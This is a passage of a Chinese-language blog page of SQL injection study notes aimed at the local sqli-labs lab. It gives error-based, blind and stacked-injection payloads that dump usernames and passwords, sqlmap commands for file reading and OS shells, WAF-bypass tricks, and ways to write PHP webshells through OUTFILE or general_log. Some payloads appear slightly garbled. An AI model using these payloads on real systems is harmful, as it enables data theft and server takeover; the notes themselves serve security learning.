class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="extractvalue">extractvalue</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">描述：使用xpath表示法从<span class="hljs-type">XML</span>字符串中提取值<br>xml_docment:<span class="hljs-type">xml</span>标记<br>Xpthstring: 显示输入语句<br>new_value:新值<br>数据库名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,concat(<span class="hljs-keyword">database</span>())))<span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,concat((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>))))<span class="hljs-comment">--+</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,concat((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))))<span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users)))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="floor">floor()</h4><p>floor的讲解参考：https://www.cnblogs.com/litlife/p/8472323.html</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">floor,count,<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>冲突报错<br>数据库名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> count(*),concat(<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x7e</span>,floor(rand(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x) a)<span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(),concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;~&#x27;</span>,floor(rand(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(),concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">5</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;~&#x27;</span>,floor(rand(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count() ,concat(<span class="hljs-string">&#x27;~&#x27;</span>(<span class="hljs-keyword">select</span> concat(username,&quot;;&quot;,<span class="hljs-keyword">password</span>,&quot;;&quot;)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">limit</span> <span class="hljs-number">5</span>,<span class="hljs-number">1</span>),floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="exp">exp()</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">数据库名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())x))<span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>)x))<span class="hljs-comment">-- +</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>)x))<span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(username,<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users)x))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="其他">其他</h4><p>参考https://blog.csdn.net/weixin_54217950/article/details/122938063</p><p>如果显示不完整： substring(database(),5,10)Substring是字符截取函数，从数据里面第五个字符开始截取十个字符</p><h3 id="时间盲注">时间盲注</h3><p><code>if(expr1,expr2,expr3)</code>-&gt;如果expr1是true，则返回expr2；否则返回expr3。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br><span class="hljs-attribute">1</span>&#x27; and if(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;s&#x27;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment">#用ascii码的好处：MYSQL不区分大小写&#x27;s&#x27;=&#x27;S&#x27;为真</span><br><span class="hljs-attribute">1</span>&#x27; and if(ord(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">114</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></table></figure><h3 id="堆叠注入">堆叠注入</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> databases<span class="hljs-meta">#</span><br><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> databases<span class="hljs-meta">#</span><br><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> databases;<br><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> tables<span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> columns from words<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h3 id="改表字段名">改表、字段名</h3><p>有words表和1919810931114514表情况下</p><pre><code class="hljs">1. 将表words的名称改为其他的（如words1），2. 将1919810931114514改为words.3. 将flag改为id,4. 在输入栏中输入1&#39; or 1=1,将其中的数据全部输出，即为flag.</code></pre><p>语句：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">rename</span> <span class="hljs-keyword">tables</span> words <span class="hljs-keyword">to</span> words1 ;<br><span class="hljs-keyword">rename</span> <span class="hljs-keyword">tables</span> <span class="hljs-number">1919810931114514</span> <span class="hljs-keyword">to</span> words ;<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words change flag id <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);#<br></code></pre></td></tr></table></figure><p>sqlmap使用</p><p>参考资料：https://blog.csdn.net/u011377996/article/details/81368482sql注入的防御： https://blog.51cto.com/u_12332766/2137035https://www.freebuf.com/vuls/265308.html</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">常用语句：<br>判断是否存在注入 sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1<br>读取日志的请求进行检测 sqlmap -l request.txt<br>查询当前的所有数据库 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--dbs</span><br>获取数据库下的表名 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security <span class="hljs-params">--tables</span><br>获取表中的字段名 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security -T users <span class="hljs-params">--columns</span><br>获取字段的内容 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security -T users -C username,password <span class="hljs-params">--dump</span><br>获取数据库的所有用户 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--users</span><br>获取数据库用户的密码 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--password</span><br>获取当前数据库的名称 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--current-db</span><br>获取当前数据库的用户 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--current-user</span><br>sqlmap获取数据库名、数据库表、数据库字段<br>sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--current-db</span><br>sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security <span class="hljs-params">--tables</span><br>sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security -T users <span class="hljs-params">--columns</span><br>获取指定表中的数据 sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security -T users <span class="hljs-params">--dump</span><br>获取所有表的数据 sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--dump-all</span><br>sqlmap读取系统文件 sqlmap -u http:<span class="hljs-string">//192.168.75.141/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--file-read=/etc/os-release</span><br>sqlmap写入系统文件 sqlmap -u http:<span class="hljs-string">//192.168.75.141/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--file-write=/root/test</span>.php <span class="hljs-params">--file-dest=/var/www/html/test</span>.php<br>sqlmap执行系统命令 sqlmap -u http:<span class="hljs-string">//192.168.75.141/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--os-shell</span><br><br>参数：<br><br><span class="hljs-params">--level</span> 探测等级：1-5，默认为1，等级越高，payload越多，速度越慢。HTTP cookei在level为2时就会测试，HTTP User-Agent/Referer在level为3时就会测试。<br><span class="hljs-params">--risk</span> 危险登录：1-3，默认为1，等级越高，越可能对数据库造成破坏<br><span class="hljs-params">--id-dba</span> 确认当前用户为管理权限（是否为root权限，mssql下最高权限为sa）<br><span class="hljs-params">--sql-shell</span> 运行自定义sql语句<br><span class="hljs-params">--os-cmd</span>,<span class="hljs-params">--os-shell</span> 运行任意操作系统命令<br><span class="hljs-params">--file-read</span> 从数据库服务器中读取文件<br><span class="hljs-params">--file-write</span> 上传文件到数据库服务器中<br><span class="hljs-params">--flush-session</span> 清空已保存的会话信息<br><span class="hljs-params">--dbs</span> 所有数据库<br><span class="hljs-params">--current-db</span> 网站当前数据库<br><span class="hljs-params">--users</span> 所有数据库用户<br><span class="hljs-params">--current-user</span> 当前数据库用户<br><span class="hljs-params">--random-agent</span> 构造随机user-agent<br><span class="hljs-params">--passwords</span> 数据库密码<br><span class="hljs-params">--proxy</span> http:<span class="hljs-string">//local</span><span class="hljs-function">:8080</span> –threads 10 <span class="hljs-params">(可以自定义线程加速)</span> 代理<br><span class="hljs-params">--time-sec=TIMESEC</span> DBMS响应的延迟时间（默认为5秒)<br><span class="hljs-params">--threads=</span> 使用多少线程<br></code></pre></td></tr></table></figure><h2 id="bypass-waf">Bypass waf</h2><p>绕过and、or</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">if((<span class="hljs-number">1</span>=<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-string">||</span><br><span class="hljs-meta">&amp;&amp;</span><br></code></pre></td></tr></table></figure><p>绕过空格</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br><span class="hljs-comment">/**/</span><br></code></pre></td></tr></table></figure><p>绕过order by</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>order<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span>by <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>绕过union select</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span><span class="hljs-regexp">/*!50441select*/</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br>unIon<br>selECt<br></code></pre></td></tr></table></figure><p>绕过database(),user()</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span><span class="hljs-regexp">/*!50441select*/</span> <span class="hljs-number">1</span>,database(<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span>*<span class="hljs-regexp">/),user(/</span>*<span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span>)<br></code></pre></td></tr></table></figure><p>获取表名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/*//////*/</span><span class="hljs-comment">/*!50441select*/</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>(<span class="hljs-comment">/*///*/</span>)<br></code></pre></td></tr></table></figure><p>获取列名</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span><span class="hljs-regexp">/*!50441select*/</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,group_concat(column_name) from information_schema.columns where%<span class="hljs-number">20</span>table_schema=database(<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span>*<span class="hljs-regexp">/) and/</span>*<span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span>table_name=<span class="hljs-string">&quot;admin&quot;</span><br></code></pre></td></tr></table></figure><p>获取数据</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/*//////*/</span><span class="hljs-comment">/*!50441select*/</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-keyword">password</span>),group_concat(username) <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span><br></code></pre></td></tr></table></figure><p>fuzz</p><h2 id="mysql写shell提权">mysql写shell、提权</h2><h3 id="shell">shell</h3><p>一般情况下 Linux 系统下面权限分配比较严格，MySQL用户一般情况下是无法直接往站点根目录写入文件的，在 Windows环境下成功率会很高。</p><h4 id="outfile和dumpfile">outfile和dumpfile</h4><p>条件</p><ol type="1"><li><p>要知道网站绝对路径，可以通过报错，phpinfo界面，404界面等一些方式知道</p></li><li><p>gpc为off，on的话单引号被转义了，语句就不能正常执行了</p></li><li><p>要有file权限，默认情况下只有root有</p></li></ol><p><code>select user,file_priv from mysql.user;</code></p><ol start="4" type="1"><li><p>对目录要有写权限</p></li><li><p><code>secure_file_priv</code>的值非NULL或为导出的绝对路径</p></li></ol><p>​secure_file_priv的值在mysql配置文件my.ini中设置，这个参数用来限制数据导入导出​Mysql&gt;=5.5.53 默认为NULL，即默认禁止导入导出 ​ Mysql&lt;5.5.53默认为空，即默认无限制</p><p>​ <code>show global variables like '%secure_file_priv%';</code></p><h4 id="union">union</h4><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1&#x27; union select 1,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;,3 into outfile &#x27;C:/shell.php&#x27;%23</span><br><span class="language-xml">?id=1&#x27; union select 1,&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;,3 into dumpfile &#x27;C:/shell.php&#x27;%23</span><br><span class="language-xml"></span><br><span class="language-xml">hex</span><br><span class="language-xml">id=-1&#x27; union select 1,0x3c3f70687020706870696e666f28293b3f3e,3 into outfile &quot;C:/shell.php&quot;%23</span><br></code></pre></td></tr></table></figure><h4 id="非union">非union</h4><p>使用<code>fields terminated by</code>与<code>lines terminated by</code>写shell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; FIELDS TERMINATED BY &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;%23</span><br><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; FIELDS TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e %23</span><br><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; lines terminated by &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;%23</span><br><span class="language-xml">?id=1 into outfile &#x27;C:/info.php&#x27; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e %23</span><br></code></pre></td></tr></table></figure><h4 id="outfile和dumpfile的区别">outfile和dumpfile的区别</h4><p><strong>outfile</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">支持多行数据同时导出<br>使用<span class="hljs-built_in">union</span>联合查询时，要保证两侧查询的列数相同<br>会在换行符制表符后面追加反斜杠<br>会在末尾追加换行(所以不能直接写入二进制文件)<br></code></pre></td></tr></table></figure><p><strong>dumpfile</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">每次只能导出一行数据<br>不会在换行符制表符后面追加反斜杠<br>不会在末尾追加换行<br>如果服务器端本身的查询语句，结果有多行，但是我们又想使用<span class="hljs-keyword">dump</span> <span class="hljs-keyword">file</span>，应该手动添加 limit 限制<br></code></pre></td></tr></table></figure><h3 id="日志写shellgeneral_log">日志写shell(general_log)</h3><p><code>secure_file_priv</code> Mysql&gt;=5.5.53默认为NULL，即默认禁止导入导出 Mysql&lt;5.5.53默认为空，即默认无限制</p><p>在5.5.53版本后无法用sql语句修改<code>secure_file_priv</code>，利用日志将shell写入日志中</p><p>条件</p><ol type="1"><li><p>对目录要有写权限</p></li><li><p>高权限运行 MySQL 或者 Apache</p></li></ol><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)</span><br><span class="language-xml">show variables like &#x27;%general%&#x27;;</span><br><span class="language-xml">开启日志监测，默认关闭(如果一直开文件会很大的)</span><br><span class="language-xml">set global general_log = on;</span><br><span class="language-xml">设置日志路径</span><br><span class="language-xml">set global general_log_file = &#x27;/var/www/html/info.php&#x27;;</span><br><span class="language-xml">执行查询，写入shell</span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title 